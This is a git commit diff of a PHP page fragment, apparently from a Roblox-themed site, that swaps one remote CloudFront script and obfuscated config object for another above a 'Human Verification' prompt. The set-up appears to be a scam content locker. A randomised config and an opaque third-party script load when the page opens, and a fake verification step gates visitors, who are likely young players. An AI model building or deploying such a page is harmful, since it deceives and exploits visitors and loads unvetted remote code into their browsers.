a793c155adb8a55e103fcf2b53e4ecc1e47b83bf
Rdlakhal <154924589+Rdlakhal@users.noreply.github.com>
2025-04-18 17:47:33 +0100

    Update verification.php

--- roblox1/parts/verification.php
+++ roblox1/parts/verification.php
@@ -1,9 +1,9 @@
 <?php
 ?>
 <script type="text/javascript">
-    var THIim_Xqf_ESJhjc={"it":4168397,"key":"18c32"};
+    var VZAyO_Xru_dJErec={"it":4472025,"key":"0f4d2"};
 </script>
-<script src="https://d368ol0wkasvru.cloudfront.net/25bd7ec.js"></script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/9500680.js"></script>
 <div class="human-verification-wrapper">
 	<h3>Human Verification</h3>
 	<p>You are almost done! Click on the Verify Now button below to complete human verification.</p>
